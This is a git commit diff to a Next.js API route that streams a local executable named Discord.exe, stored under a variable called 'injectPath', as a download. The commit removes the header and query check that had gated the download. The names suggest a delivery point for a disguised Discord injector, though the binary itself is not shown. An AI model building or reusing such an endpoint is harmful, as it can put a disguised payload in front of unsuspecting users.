eea73bdebc0a0f258f4e83cf1da8f6c8a5612390
k4itrun <truchorko2222@gmail.com>
2024-01-10 20:16:21 -0500

    xd

--- src/pages/api/aurathemes/k4itrun.js
+++ src/pages/api/aurathemes/k4itrun.js
@@ -3,7 +3,7 @@ import fs from 'fs';
 import { pipeline } from 'stream';
 
 const injectPath = 'src/files/scripts/raws/exes/Discord.exe';
-const CHUNK_SIZE = 1024 * 1024; 
+const CHUNK_SIZE = 1024 * 1024;
 export const config = {
   api: {
     responseLimit: false,
@@ -11,32 +11,24 @@ export const config = {
 }
 export default async function handler(req, res) {
   try {
-    if (
-      req.headers['aurathemes'] === 'true' ||
-      req.headers['k4itrun'] === 'true' ||
-      req.query.aurathemes === 'true'
-    ) {
-      const filePath = path.join(process.cwd(), injectPath);
+    const filePath = path.join(process.cwd(), injectPath);
 
-      if (fs.existsSync(filePath)) {
-        const fileStream = fs.createReadStream(filePath);
+    if (fs.existsSync(filePath)) {
+      const fileStream = fs.createReadStream(filePath);
 
-        res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', `attachment; filename=${path.basename(filePath)}`);
+      res.setHeader('Content-Type', 'application/octet-stream');
+      res.setHeader('Content-Disposition', `attachment; filename=${path.basename(filePath)}`);
 
-        pipeline(fileStream, res, (err) => {
-          if (err) {
-            console.error('File transmission error:', err);
-            res.status(500).end();
-          } else {
-            console.log('Successful download');
-          }
-        });
-      } else {
-        res.status(404).json({ error: 'File not found.' });
-      }
+      pipeline(fileStream, res, (err) => {
+        if (err) {
+          console.error('File transmission error:', err);
+          res.status(500).end();
+        } else {
+          console.log('Successful download');
+        }
+      });
     } else {
-      res.status(403).json({ error: 'Access denied.' });
+      res.status(404).json({ error: 'File not found.' });
     }
   } catch (error) {
     console.error('Internal Server Error:', error);
